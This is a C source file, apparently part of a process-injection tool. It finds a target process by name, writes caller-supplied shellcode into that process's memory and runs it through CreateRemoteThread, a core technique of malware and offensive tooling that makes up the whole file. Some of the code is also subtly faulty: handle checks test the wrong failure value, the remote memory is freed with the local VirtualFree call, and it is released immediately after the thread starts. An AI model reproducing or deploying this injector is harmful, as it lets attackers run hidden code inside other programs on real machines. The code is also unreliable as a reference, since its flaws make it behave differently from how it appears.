#include "procinject.h"


_Use_decl_annotations_
DWORD
WINAPI
GetProcessByName(
	LPWSTR lpProcessName
)
{
	HANDLE hProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD dwLastError = ERROR_SUCCESS;

	if (hProcesses == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[%s:%i] Snapshot failed", __FUNCTION__, __LINE__);
		return -1;
	}

	PROCESSENTRY32W p32;
	p32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hProcesses, &p32))
	{
		fprintf(stderr, "[%s:%d] Could not find start of snapshot", __FUNCTION__, __LINE__);
		dwLastError = -1;
		goto cleanup;
	}

	do {
		if (!wcscmp(p32.szExeFile, lpProcessName))
		{
			dwLastError = p32.th32ProcessID;
			break;
		}
	} while (Process32NextW(hProcesses, &p32));

cleanup:
	CloseHandle(hProcesses);

	return dwLastError;
}



_Use_decl_annotations_
DWORD
WINAPI
ExecuteRemoteThread(
	DWORD dwProcId,
	PBYTE pbShellCode,
	size_t shellCodeSize
)
{
	printf("Opening processs %ld\n", dwProcId);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcId);
	DWORD dwLastError = ERROR_SUCCESS;

	if (hProcess == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "[%s:%i]: Failed to open process 0x%08lX", __FUNCTION__, __LINE__, GetLastError());
		return GetLastError();
	}

	LPVOID pShellAddr = VirtualAllocExNuma(
		hProcess,
		NULL,
		shellCodeSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READ,
		0
	);

	if (pShellAddr == NULL) 
	{
		dwLastError = GetLastError();
		goto closeremoteproc;
	}

	SIZE_T bytesWritten;
	BOOL bWriteMem = WriteProcessMemory(hProcess, pShellAddr, pbShellCode, shellCodeSize, &bytesWritten);
	if (!bWriteMem)
	{
		fprintf(stderr, "Failed to write\n");
		dwLastError = GetLastError();
		goto freemem;
	}

	HANDLE rt = CreateRemoteThread(hProcess, NULL, 0, pShellAddr, NULL, 0, NULL);
	if (rt == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "Failed to thread the needle\n");
		dwLastError = GetLastError();
		goto freemem;
	}

	CloseHandle(rt);

freemem:
	VirtualFree(pShellAddr, shellCodeSize, MEM_DECOMMIT | MEM_RELEASE);

closeremoteproc:
	CloseHandle(hProcess);

	return dwLastError;
}
